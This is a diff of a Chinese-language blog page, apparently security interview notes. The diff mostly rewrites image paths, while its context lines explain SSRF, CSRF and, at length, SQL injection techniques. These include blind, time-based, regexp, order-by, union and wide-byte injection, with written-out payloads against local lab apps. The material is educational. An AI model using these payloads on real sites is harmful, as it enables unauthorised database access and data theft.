@@ -474,7 +474,7 @@
         <p>响应码：200、302重定向、404未找到、500服务器错误、403被禁止</p>
 <h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p>(Server-Side Request Forgery:服务请求伪造)是一种由攻击者构造，从而让服务端发起请求的一种安全漏洞， 它将一个可以发起网络请求的服务当作跳板来攻击其他服务，SSRF的攻击目标一般是内网。       当服务端提供了从其他服务器获取数据的功能(如:从指定URL地址获取网页文本内容、加载指定地址的图片、下载等)， 但是没有对目标地址做过滤与限制时就会出现SSRF。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1. 从WEB功能上寻找 </span><br><span class="line">    通过URL分享内容</span><br><span class="line">    文件处理、编码处理、转码等服务</span><br><span class="line">    在线翻译</span><br><span class="line">    通过URL地址加载与下载图片</span><br><span class="line">    图片、文章的收藏</span><br><span class="line">    设置邮件接收服务器</span><br><span class="line">2. 从URL关键字寻找</span><br><span class="line">    share、wap、url、link、src、source、target、u、3g、</span><br><span class="line">    display、sourceURl、imageURL、domain...</span><br></pre></td></tr></table></figure>
-<p><img src="1555428552473.png" alt="1555428552473"></p>
+<p><img src="/2019/04/22/interview/1555428552473.png" alt="1555428552473"></p>
 <h1 id="Csrf"><a href="#Csrf" class="headerlink" title="Csrf"></a>Csrf</h1><p>攻击者盗用了你的身份，以你的名义发送恶意请求。</p>
 <p>1、登录受信任网站A，并在本地生成Cookie。</p>
 <p>2、在不登出A的情况下，访问危险网站B加固方法：</p>
@@ -583,38 +583,38 @@
 <p>length（可选）规定被返回字符串的前length长度的字符</p>
 <p>ascii(a)将a转换成其ASCII值 </p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">left (database(),1)=2</span><br></pre></td></tr></table></figure>
-<p><img src="1554043896144.png" alt="1554043896144"></p>
+<p><img src="/2019/04/22/interview/1554043896144.png" alt="1554043896144"></p>
 </li>
 </ol>
 <p>猜解数据库长度，</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and length(database())&gt;2 %23  以次改变 显示正常时正确</span><br></pre></td></tr></table></figure>
-<p><img src="1554016830002.png" alt="1554016830002"></p>
+<p><img src="/2019/04/22/interview/1554016830002.png" alt="1554016830002"></p>
 <p>猜解数据库名</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and substr(database())&gt;&apos;r&apos; %23 同理判断</span><br></pre></td></tr></table></figure>
-<p><img src="1554017028611.png" alt="1554017028611"></p>
+<p><img src="/2019/04/22/interview/1554017028611.png" alt="1554017028611"></p>
 <p>继续猜解第二个字符</p>
 <p>由此可推断第一个字符是s<br>接下来判断第二个字符：<br><a href="http://127.0.0.1/sqlilabs/Less-5/?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/sqlilabs/Less-5/?id=1&#39;</a> and left(database(),2)&gt;’sd’%23</p>
 <p>‘sd’&lt;’当前数据库名的前两位字符’&lt;’sf’       所以当前数据库名的第二位字符为’e’。以此类推，最后得到当前数据库名为“security”</p>
 <p>猜解表名</p>
 <p>先猜解表名长度</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">id=1&apos; and length((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1))&lt;5 %23  </span><br><span class="line">先判断范围 再用等号判断值  返回正确为止 </span><br><span class="line">实际执行</span><br><span class="line">select length((select table_name from information_schema.tables where table_schema=&apos;pikachu&apos; limit 0,1))</span><br></pre></td></tr></table></figure>
-<p><img src="1554025935234.png" alt="1554025935234"></p>
+<p><img src="/2019/04/22/interview/1554025935234.png" alt="1554025935234"></p>
 <p>确定表明</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&apos; and  ascii( mid((select table_name from information_schema.tables where table_schema=&apos;pikachu&apos; limit 0,1)from(2)for(1)) ) %23  这里进行assii 进行比较 逐个猜解</span><br></pre></td></tr></table></figure>
 <p>查询表的数量</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;  and (select count(table_name) from information_schema.tables where table_schema=&apos;pikachu&apos; )&gt;1 %23</span><br></pre></td></tr></table></figure>
-<p><img src="1554040600900.png" alt="1554040600900"></p>
+<p><img src="/2019/04/22/interview/1554040600900.png" alt="1554040600900"></p>
 <p>查询列的个数</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;  and (select count(column_name) from information_schema.columns where table_name=&apos;users&apos;)&gt;2</span><br></pre></td></tr></table></figure>
 <p>在夹逼出列名</p>
-<p><img src="1554040934363.png" alt="1554040934363"></p>
-<p><img src="1554041228074.png" alt="1554041228074"></p>
-<h2 id="正则匹配的盲注-regexp注入"><a href="#正则匹配的盲注-regexp注入" class="headerlink" title="正则匹配的盲注  regexp注入  "></a><strong>正则匹配的盲注</strong>  <strong>regexp注入  </strong></h2><p><img src="1554047306509.png" alt="1554047306509"></p>
+<p><img src="/2019/04/22/interview/1554040934363.png" alt="1554040934363"></p>
+<p><img src="/2019/04/22/interview/1554041228074.png" alt="1554041228074"></p>
+<h2 id="正则匹配的盲注-regexp注入"><a href="#正则匹配的盲注-regexp注入" class="headerlink" title="正则匹配的盲注  regexp注入  "></a><strong>正则匹配的盲注</strong>  <strong>regexp注入  </strong></h2><p><img src="/2019/04/22/interview/1554047306509.png" alt="1554047306509"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select (select password from users where id = 1)regexp&apos;^e10&apos;</span><br></pre></td></tr></table></figure>
 <p>regexp这个关键字还可以代替where条件里的=号</p>
-<p><img src="1554047568041.png" alt="1554047568041"></p>
+<p><img src="/2019/04/22/interview/1554047568041.png" alt="1554047568041"></p>
 <h2 id="使用场景过滤了-、in、like"><a href="#使用场景过滤了-、in、like" class="headerlink" title="使用场景过滤了=、in、like"></a>使用场景过滤了=、in、like</h2><p>这里的^如果也被过滤了的话，可以使用$来从后往前进行匹配</p>
-<p><img src="1554047808019.png" alt="1554047808019"></p>
+<p><img src="/2019/04/22/interview/1554047808019.png" alt="1554047808019"></p>
 <h2 id="order-by盲注"><a href="#order-by盲注" class="headerlink" title="order by盲注"></a>order by盲注</h2><h3 id="1、基本注入payload"><a href="#1、基本注入payload" class="headerlink" title="1、基本注入payload"></a>1、基本注入payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where user_id = &apos;1&apos; union select 1,2,&apos;a&apos;,4,5,6,7 order by 3</span><br></pre></td></tr></table></figure>
 <p>首先先看看order by的使用方法：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order by &apos;number&apos; (asc/desc)</span><br></pre></td></tr></table></figure>
@@ -622,8 +622,8 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users order by 3 asc</span><br></pre></td></tr></table></figure>
 <p>我们在注入时经常会使用order by来判断数据库的列数，那我们这里使用他配合union select来进行注入</p>
 <p>2、原理分析</p>
-<p>首先正常的注入是蓝色那部分的字符串，这里我们的目的是要注出test用户的user_pass值<br><img src="t01c82b98f9bd65effc.png" alt="img"><strong>接着我们在语句后面加上order by 3，即对第三列进行升序排列(按照ascii码表)</strong></p>
-<p><img src="t01c161fc6c34cd8fde.png" alt="img">这里的user_pass列中的3是我们union select里面的第三列，这里就把<code>3</code>替换为<code>a</code><br><img src="t0101ef42a1afcf0ae7.png" alt="img">这里可能看不出什么变化，那么把他改成<code>b</code>看看<br><img src="t014e91c51e99d488d7.png" alt="img">看到用户test跑到第一行来了，所以这里经常用来判断有返回差异的注入，且返回只有一列的输出，根据差异来判断我们盲注的值是否正确</p>
+<p>首先正常的注入是蓝色那部分的字符串，这里我们的目的是要注出test用户的user_pass值<br><img src="/2019/04/22/interview/t01c82b98f9bd65effc.png" alt="img"><strong>接着我们在语句后面加上order by 3，即对第三列进行升序排列(按照ascii码表)</strong></p>
+<p><img src="/2019/04/22/interview/t01c161fc6c34cd8fde.png" alt="img">这里的user_pass列中的3是我们union select里面的第三列，这里就把<code>3</code>替换为<code>a</code><br><img src="/2019/04/22/interview/t0101ef42a1afcf0ae7.png" alt="img">这里可能看不出什么变化，那么把他改成<code>b</code>看看<br><img src="/2019/04/22/interview/t014e91c51e99d488d7.png" alt="img">看到用户test跑到第一行来了，所以这里经常用来判断有返回差异的注入，且返回只有一列的输出，根据差异来判断我们盲注的值是否正确</p>
 <p>当然这里也可以使用order by desc降序排列来注入，所以这里要根据使用场景来进行选择</p>
 <h2 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.0.0.21/yanci.php?username=root&apos; and sleep(5)%23</span><br></pre></td></tr></table></figure>
 <p>或者</p>
@@ -652,10 +652,10 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(select table_name from information_schema.tables where table_schema=database() limit 0,1 )    改变0 即可查看其他表</span><br></pre></td></tr></table></figure>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">group_concat(select table_name from information_schema.tables where table_schema=database())</span><br></pre></td></tr></table></figure>
 <p>查询单个表</p>
-<p><img src="1554128693639.png" alt="1554128693639"></p>
+<p><img src="/2019/04/22/interview/1554128693639.png" alt="1554128693639"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">concat(select table_name from information_schema.tables where table_schema=database()) limit 0,1</span><br></pre></td></tr></table></figure>
 <p>报出所有表明</p>
-<p><img src="1554128418032.png" alt="1554128418032"></p>
+<p><img src="/2019/04/22/interview/1554128418032.png" alt="1554128418032"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=1&apos;  union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3 and &apos;%&apos;=&apos;</span><br></pre></td></tr></table></figure>
 <h4 id="搜索型注入-判断"><a href="#搜索型注入-判断" class="headerlink" title="搜索型注入 判断"></a>搜索型注入 判断</h4><p>一般都用 like’%%’进行模糊查询</p>
 <p>​    ‘and 1=1 and ‘%’=’</p>
@@ -666,7 +666,7 @@
 <p>优势：过滤了逗号的情况下使用</p>
 <p>下面的payload(别的博客处摘抄来的)适用于过滤了逗号和字段名的情况下使用</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">union all</span><br><span class="line">select * from(</span><br><span class="line">    (select 1)a join(</span><br><span class="line">        select F.[需要查询的字段号] from(</span><br><span class="line">            select * from [需要查询的表有多少个字段就join多少个]</span><br><span class="line">            union</span><br><span class="line">            select * from [需要查询的表] [limit子句]</span><br><span class="line">        )F-- 我们创建的虚拟表没有表名，因此定义一个别名，然后直接[别名].[字段号]查询数据</span><br><span class="line">    )b-- 同上[还差多少字段就再join多少个，以满足字段数相同的原则]</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
-<h2 id="带-的注入"><a href="#带-的注入" class="headerlink" title="带!的注入"></a>带<code>!</code>的注入</h2><p><strong>直接看下面的payload，适用于and、or、^被过滤的情况下使用，有时候可能也会使用到，但是具体的原理不是很明白，大家可以自行google</strong><img src="1554130494912.png" alt="1554130494912"></p>
+<h2 id="带-的注入"><a href="#带-的注入" class="headerlink" title="带!的注入"></a>带<code>!</code>的注入</h2><p><strong>直接看下面的payload，适用于and、or、^被过滤的情况下使用，有时候可能也会使用到，但是具体的原理不是很明白，大家可以自行google</strong><img src="/2019/04/22/interview/1554130494912.png" alt="1554130494912"></p>
 <h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>在GBK编码时，mysql会认为两个字符是一个汉字（在前一个字节的ascii码大于128的情况下）。而经过转义之后的单引号’会变为\’，即%5c%27。构造id=1%df%27%23  (id=1%df’   sql  %23 )</p>
 <p>对于宽字节编码，有一种最好的修补就是：</p>
 <p>（1）使用mysql_set_charset(GBK)指定字符集</p>
@@ -675,8 +675,8 @@
 <p>就是使用mysql_set_charset进行指定。</p>
 <p>上述的两个条件是“与”运算的关系，少一条都不行。</p>
 <p>测试;</p>
-<p><img src="20180725163629473.png" alt="img"><br>输出：</p>
-<p><img src="2018072516363889.png" alt="img"><br>效果很明显。</p>
+<p><img src="/2019/04/22/interview/20180725163629473.png" alt="img"><br>输出：</p>
+<p><img src="/2019/04/22/interview/2018072516363889.png" alt="img"><br>效果很明显。</p>
 <h1 id="Tips"><a href="#Tips" class="headerlink" title="Tips:"></a>Tips:</h1><p>如果我们这里的limit被过滤了咋办？那就试试下面的几种方法：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(1) group_concat(使用的最多)</span><br><span class="line">(2) &lt;&gt;筛选(不等于)</span><br><span class="line">(3) not in</span><br><span class="line">(4) DISTINCT</span><br></pre></td></tr></table></figure>
 <h2 id="总结的注入流程"><a href="#总结的注入流程" class="headerlink" title="总结的注入流程"></a>总结的注入流程</h2><p>1、先找到注入点，id=，username=，判断GET/POST/COOKIE注入</p>
@@ -826,7 +826,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">7</span>
+                    <span class="site-state-item-count">6</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
@@ -843,7 +843,11 @@
                     
                       
                     
-                    <span class="site-state-item-count">2</span>
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">4</span>
                     <span class="site-state-item-name">分类</span>
                   
                 </div>
@@ -862,7 +866,13 @@
                     
                       
                     
-                    <span class="site-state-item-count">3</span>
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">6</span>
                     <span class="site-state-item-name">标签</span>
                   
                 </div>
